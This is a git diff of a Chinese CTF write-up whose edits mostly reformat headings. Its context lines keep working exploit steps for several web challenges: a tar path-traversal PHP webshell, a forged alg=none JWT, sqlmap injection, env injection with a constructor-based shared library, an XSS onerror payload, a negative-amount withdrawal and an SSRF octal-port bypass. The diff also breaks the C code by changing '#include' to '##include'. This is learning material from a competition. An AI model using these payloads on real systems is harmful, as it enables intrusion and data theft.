 可以在 更多工具 那里查看源代码，也可以直接在 uri 之前加上 `view-source:`
 
-## ez_upload
+### ez_upload
 
 <https://gemini.google.com/share/a3b3a8cc9019>
 
-### 分析
+#### 分析
 
 ```php
 <?php
@@ -1209,7 +1209,7 @@ exec('cd /tmp && tar -xvf ' . escapeshellarg($filename) . ' && pwd', $output);
 
 此处可以利用 tar 的路径穿越漏洞
 
-### HACK
+#### HACK
 
 > 以下两个压缩过程可以合作一个；为了不污染我的环境，我选择听从 AI 😋
 
@@ -1219,7 +1219,7 @@ tar -cvf link.tar exploit
 rm exploit
 ```
 
-创建一个同名目录来放置 cmd.php （其实直接压缩然后修改压缩包内的路径应该也行）
+创建一个同名目录来放置 cmd.php（其实直接压缩然后修改压缩包内的路径应该也行）
 
 ```sh
 mkdir exploit
@@ -1237,11 +1237,11 @@ echo shell_exec("find / -name '*flag*' -type f 2>/dev/null -exec cat {} \;");
 tar -cvf shell.tar exploit/cmd.php
 ```
 
-## PacmanOL
+### PacmanOL
 
 直接打到 300 分！
 
-## tradingPlatform1
+### tradingPlatform1
 
 登陆界面，输入 `admin` `123456` 发现需要 `X-Forwarded-For`
 
@@ -1288,22 +1288,22 @@ Table: secret
 +----+---------+--------------------------------------------+
 ```
 
-## tradingPlatform2
+### tradingPlatform2
 
 <https://gemini.google.com/share/62b530c80a44>
 
-### 提权分析
+#### 提权分析
 
 Hint: 应用喜欢把数据存储在本地
 分析 localStorage；一开始是没有东西的，需要 login 一下（错误的也无妨），会生成一个 token 供参考，将格式化后的 js 文件一并给 AI 发现这里的权限验证是在前端完成的，参考 token 信息发现可以进行 JWT 伪造
 
-#### JWT 伪造（写到 localStorage 的 token 中）
+##### JWT 伪造（写到 localStorage 的 token 中）
 
 ```txt
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE3NjM4Njg4MzEsInN1YiI6eyJuYW1lIjoiYWRtaW4iLCJpc19sb2dpbiI6dHJ1ZX19.
 ```
 
-### HACK
+#### HACK
 
 进入之后抓包，找到以下 API 端点（只有这一个端点），由于有查询数据库的成分，尝试进行 SQL 注入
 
@@ -1333,9 +1333,9 @@ sqlmap -u "http://$REMOTE/api/candle?symbol=ETH-USDT&start_time=2025-10-29&end_t
 +----+--------+--------------------------------------------+----------+-------------+
 ```
 
-## SlowUGI-Downloader
+### SlowUGI-Downloader
 
-### 提权
+#### 提权
 
 ```sh
 curl -v \
@@ -1344,7 +1344,7 @@ curl -v \
  http://${target}/ugi-bin/login.ugi?username=1&password=1
 ```
 
-借助 env 覆盖掉 `USERNAME` 和 `PASSWORD`，获取到 cookie （并且此时一并创建了 data/sessions 文件夹，auth 的路径穿越攻击可以实现了（但是这个只能用来 auth，无法读取文件、执行命令）
+借助 env 覆盖掉 `USERNAME` 和 `PASSWORD`，获取到 cookie（并且此时一并创建了 data/sessions 文件夹，auth 的路径穿越攻击可以实现了（但是这个只能用来 auth，无法读取文件、执行命令）
 
 ```sh
 curl -v -b "TOKEN=../../../../../../proc/self/exe" "http://127.0.0.1:8000/ugi-bin/auth.ugi"
@@ -1352,7 +1352,7 @@ curl -v -b "TOKEN=../../../../../../proc/self/exe" "http://127.0.0.1:8000/ugi-bi
 
 不过也拿到 cookie 了，这个路径穿越也没用了。
 
-### HACK
+#### HACK
 
 接下来的思路也是 Env 注入
 
@@ -1361,9 +1361,9 @@ curl -v -b "TOKEN=../../../../../../proc/self/exe" "http://127.0.0.1:8000/ugi-bi
 先生成一个 exploit.so
 
 ```c
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
+##include <stdlib.h>
+##include <stdio.h>
+##include <string.h>
 
 // _init 函数会在库加载时自动执行
 void __attribute__((constructor)) call_me_exploit() {
@@ -1404,16 +1404,16 @@ curl -v \
 
 访问 http://${target}/flag.txt
 
-## Worthit
+### Worthit
 
-### 提权
+#### 提权
 
 18 岁生日
 
 Luminoria
 20061105
 
-### API 端点
+#### API 端点
 
 ```js
 await fetch("http://8.138.24.149:30641/api/admin/items", {
@@ -1435,13 +1435,13 @@ await fetch("http://8.138.24.149:30641/api/admin/items", {
 });
 ```
 
-### XSS
+#### XSS
 
 题目的 Call 提示得很明显，考虑 XSS 注入
 
 因为没有出网，所以选择通过创建新的 item 来传递信息
 
-#### client payload
+##### client payload
 
 ```js
 // botScript
@@ -1469,7 +1469,7 @@ fetch("/api/admin/items", {
 });
 ```
 
-#### XSS payload
+##### XSS payload
 
 ```js
 const payload = `<img src=x onerror="${botScript.replace(/\n/g, " ").replace(/"/g, "'")}">`;
@@ -1477,11 +1477,11 @@ const payload = `<img src=x onerror="${botScript.replace(/\n/g, " ").replace(/"/
 
 （其实 botScript 用 base64 传递应该会更优雅一些）
 
-## Y2K BANK
+### Y2K BANK
 
-### 分析
+#### 分析
 
-抓包得到3个重要端点：
+抓包得到 3 个重要端点：
 
 - `/api/login`
 - `/api/withdraw`
@@ -1490,10 +1490,10 @@ const payload = `<img src=x onerror="${botScript.replace(/\n/g, " ").replace(/"/
 测试取款接口 `/api/withdraw`，发现使用负数金额时，取款变成了存款！、
 发现数额太大好像不太行，让 AI 通过倍增等方法找到上界是 1,000,000,000
 
-### HACK
+#### HACK
 
 ```bash
-# 重新登陆好像会刷新 balance
+## 重新登陆好像会刷新 balance
 set TOKEN (curl -s -X POST http://$REMOTE/api/login \
   -H "Content-Type: application/json" \
   -d '{"username":"CTF","password":"P@SsW0rd"}' | jq -r '.access_token')
@@ -1514,9 +1514,9 @@ curl -s http://$REMOTE/api/gift \
   -H "Authorization: Bearer $TOKEN" | jq -r '.flag'
 ```
 
-## Interstellar
+### Interstellar
 
-### 注入、分析环境
+#### 注入、分析环境
 
 ```php
 ini_set('display_errors', 1);
@@ -1547,7 +1547,7 @@ if (file_put_contents($ini_file, $new_content) !== false) {
 }
 ```
 
-### 读取管理面板 app 源码
+#### 读取管理面板 app 源码
 
 蚁剑获取 Webshell 可以在文件面板中找到 app 目录，进去发现关键文件没有权限，拷贝所有源码到本地，分析
 
@@ -1561,14 +1561,14 @@ from datetime import datetime, timezone
 from urllib.parse import quote
 
 async def get_flag():
-    # 目标和WebSocket URL
+    # 目标和 WebSocket URL
     target = ""
     ws_url = f"ws://{target}/api/proxy/webcmd"
 
     # 设置认证头
     headers = {"Cookie": f"access_token=lalalalala~"}
 
-    # SSRF绕过：八进制端口 (":8837" -> ":08837")
+    # SSRF 绕过：八进制端口 (":8837" -> ":08837")
     payload = "ws://127.0.0.1:08837/webcmd"
     final_url = f"{ws_url}?target={quote(payload)}"
 
